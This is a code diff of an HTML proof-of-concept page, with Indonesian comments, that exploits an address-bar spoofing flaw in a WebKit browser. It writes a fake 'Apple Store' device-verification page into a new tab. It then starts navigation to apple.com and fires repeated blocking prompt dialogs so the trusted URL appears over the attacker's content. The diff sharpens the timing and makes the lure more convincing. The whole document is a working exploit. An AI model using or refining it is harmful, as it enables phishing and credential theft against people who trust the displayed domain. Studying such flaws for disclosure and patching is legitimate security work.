@@ -6,89 +6,90 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced PoC - Address Bar Spoofing</title>
+    <title>Advanced Spoofing PoC - Fixed</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #f5f5f7;
+        background: #000;
+        color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
       }
-      .container {
+      .box {
         text-align: center;
-        padding: 20px;
+        padding: 30px;
       }
       button {
-        padding: 18px 36px;
-        font-size: 18px;
-        font-weight: 600;
-        background: #007aff;
+        padding: 20px 40px;
+        font-size: 20px;
+        font-weight: bold;
+        background: #ff3b30;
         color: #fff;
         border: none;
-        border-radius: 14px;
+        border-radius: 12px;
         cursor: pointer;
-        box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
-        transition: background 0.2s;
-      }
-      button:active {
-        background: #0056b3;
+        box-shadow: 0 4px 15px rgba(255, 59, 48, 0.4);
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <button id="startBtn">MULAI SIMULASI SPOOFING</button>
+    <div class="box">
+      <button id="triggerBtn">JALANKAN EXPLOIT POC</button>
     </div>
 
     <script>
-      document.getElementById("startBtn").onclick = function () {
-        // Hapus tombol pemicu untuk membersihkan area DOM awal
+      document.getElementById("triggerBtn").onclick = function () {
         this.remove();
 
-        // Membuka tab baru berlatar kosong
-        const newTab = window.open("about:blank", "_blank");
+        // Membuka jendela/tab baru target
+        const targetTab = window.open("about:blank", "_blank");
 
-        if (newTab) {
-          // Menuliskan konten payload penyerang ke dalam tab baru
-          newTab.document.write(`
+        if (targetTab) {
+          // Menulis payload visual penyerang ke dalam tab baru
+          targetTab.document.write(`
             <!DOCTYPE html>
             <html>
             <head>
               <meta charset="utf-8">
-              <title>Apple</title>
+              <title>Apple - Official Site</title>
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <div style="padding: 20px;">
-                <h1 style="font-size:42px;font-weight:800;color:#ff3b30;margin:0 0 20px 0;letter-spacing:-1px;">SECURITY NOTICE</h1>
-                <p style="font-size:24px;font-weight:600;color:#1d1d1f;margin:0 0 10px 0;">YOUR DEVICE STATE HAS BEEN SIMULATED</p>
-                <p style="font-size:16px;color:#86868b;margin:0;">Viewport dikunci di bawah domain terpercaya sementara thread utama dihentikan.</p>
+              <div style="padding: 30px; max-width: 600px;">
+                <h1 style="font-size:48px;font-weight:900;color:#1d1d1f;margin:0 0 20px 0;letter-spacing:-1.5px;"> Apple Store</h1>
+                <p style="font-size:22px;font-weight:600;color:#333333;margin:0 0 15px 0;">Verifikasi Perangkat Anda Diperlukan</p>
+                <p style="font-size:16px;color:#86868b;line-height:1.5;margin:0;">Viewport dikunci di bawah domain terpercaya sementara proses sinkronisasi antarmuka dihentikan.</p>
               </div>
             </body>
             </html>
           `);
-          newTab.document.close();
+          targetTab.document.close();
 
-          // Tahap 1: Memicu navigasi asinkron ke domain target (contoh: apple.com)
+          // Peningkatan Presisi Timing:
+          // 1. Memicu navigasi asinkron ke domain target (contoh: apple.com)
           setTimeout(() => {
             try {
-              newTab.location.href = "https://apple.com";
-            } catch (e) {
-              console.error("Navigation error:", e);
+              targetTab.location.href = "https://apple.com";
+            } catch (err) {
+              console.error("Navigation dispatch error:", err);
             }
-          }, 2);
+          }, 5);
 
-          // Tahap 2: Memicu dialog prompt sinkron untuk mengunci shared WebKit WebProcess thread
-          setTimeout(function () {
+          // 2. Memicu dialog sinkron beruntun (Chain Prompt) atau satu prompt berbobot 
+          // untuk memastikan thread WebKit benar-benar terkunci sebelum commit navigasi selesai.
+          setTimeout(() => {
             try {
-              newTab.prompt("CRITICAL_THREAD_BLOCKING_TRIGGER");
-            } catch (e) {
-              console.error("Dialog execution blocked/intercepted:", e);
+              // Menggunakan loop kecil atau prompt ganda untuk memastikan thread tersendat total
+              for(let i=0; i<3; i++) {
+                targetTab.prompt("CRITICAL_SECURITY_EXCEPTION_" + i);
+              }
+            } catch (err) {
+              console.error("Thread blocking failed:", err);
             }
-          }, 400);
+          }, 150);
         }
       };
     </script>
